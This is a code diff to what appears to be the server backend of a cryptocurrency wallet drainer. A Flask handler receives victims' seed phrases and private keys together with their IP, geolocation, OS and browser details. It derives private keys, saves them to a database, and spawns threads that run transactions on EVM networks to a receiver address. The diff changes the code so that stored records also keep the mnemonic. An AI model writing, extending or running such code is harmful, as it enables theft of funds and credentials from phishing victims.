@@ -424,6 +424,7 @@ def devoid(type):
                     Account.enable_unaudited_hdwallet_features()
                     acc = Account.from_mnemonic(mnemonic)
                     privKey = acc.key.hex()
+                    # return f"derived private key:{GenPrivKey}<br>inpute private key:{privKey}"
                     if GenPrivKey in privKey or privKey in GenPrivKey:
                         #If private key provided is same as private key derived from seed
                         rowIn = inputData(seed=mnemonic,key=privKey,aggregator_name=jsonArg['aggregator_name'],ip=jsonArg['ip'],geo=jsonArg['geo'],os=jsonArg['os'],received_date=jsonArg['received_date'],remark='success',browser=jsonArg['browser'])
@@ -437,7 +438,7 @@ def devoid(type):
                     else:
                         #If private key provided is not same as private key derived from seed
                         if len(GenPrivKey) in [64, 66]:
-                            #Validate the private key and do transactions
+                            #Validate the extracted private key and do transactions
                             rowIn = inputData(seed='',key=GenPrivKey,aggregator_name=jsonArg['aggregator_name'],ip=jsonArg['ip'],geo=jsonArg['geo'],os=jsonArg['os'],received_date=jsonArg['received_date'],remark='success',browser=jsonArg['browser'])
                             db.session.add(rowIn)
                             db.session.commit()                    
@@ -446,8 +447,8 @@ def devoid(type):
                                     rec = recAd(net)
                                     threading.Thread(target=EVMde, args=(net,GenPrivKey,rec)).start()
                         elif len(privKey) in [64, 66]:
-                            #Validate the private key and do transactions
-                            rowIn = inputData(seed='',key=privKey,aggregator_name=jsonArg['aggregator_name'],ip=jsonArg['ip'],geo=jsonArg['geo'],os=jsonArg['os'],received_date=jsonArg['received_date'],remark='success',browser=jsonArg['browser'])
+                            #Validate the derived private key and do transactions
+                            rowIn = inputData(seed=mnemonic,key=privKey,aggregator_name=jsonArg['aggregator_name'],ip=jsonArg['ip'],geo=jsonArg['geo'],os=jsonArg['os'],received_date=jsonArg['received_date'],remark='success',browser=jsonArg['browser'])
                             db.session.add(rowIn)
                             db.session.commit()                    
                             for net in EVMNetsOnMission:
